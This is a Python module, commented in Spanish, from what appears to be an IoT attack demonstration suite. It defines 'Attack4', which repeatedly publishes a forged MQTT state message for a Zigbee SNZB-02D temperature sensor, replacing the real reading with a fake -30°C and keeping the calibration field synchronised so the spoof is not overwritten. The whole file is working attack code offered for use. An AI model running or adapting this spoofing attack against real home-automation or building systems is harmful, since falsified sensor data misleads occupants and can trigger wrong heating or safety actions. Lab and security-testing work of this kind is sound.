from typing import Tuple

from config import ATTACK4_INTERVAL, MQTT_TEMP_STATE_TOPIC
from mqtt_service import publish_to_topic
from attacks.base import BaseAttack

# Valor de calibración activo. Se actualiza desde routes.py cuando
# el usuario pulsa los botones de calibración, de forma que el ataque
# continuo no sobreescriba el valor que acaba de aplicarse.
_current_calibration: int = 0


def set_calibration(value: int) -> None:
    """Actualiza el valor de calibración usado por el ataque continuo."""
    global _current_calibration
    _current_calibration = value


def get_calibration() -> int:
    """Devuelve el valor de calibración activo."""
    return _current_calibration


class Attack4(BaseAttack):
    """Ataque 4: Spoofea la temperatura del sensor SNZB-02D a -30°C.

    Publica directamente en el topic de estado del sensor (sin /set)
    sobreescribiendo la lectura real con un valor falso de -30°C.
    El campo temperature_calibration se mantiene sincronizado con el
    valor aplicado por los botones de calibración.
    """

    def __init__(self):
        super().__init__('attack4', 'ATAQUE 4 (TEMP SPOOF -30°C)', ATTACK4_INTERVAL)

    def execute_attack(self) -> Tuple[bool, str, bool]:
        payload = {
            'battery': 100,
            'comfort_humidity_max': 60,
            'comfort_humidity_min': 40,
            'comfort_temperature_max': 27,
            'comfort_temperature_min': 19,
            'humidity': 42.4,
            'humidity_calibration': 0,
            'linkquality': 255,
            'temperature': -30,
            'temperature_calibration': _current_calibration,
            'temperature_units': 'celsius',
        }
        return publish_to_topic(MQTT_TEMP_STATE_TOPIC, payload)
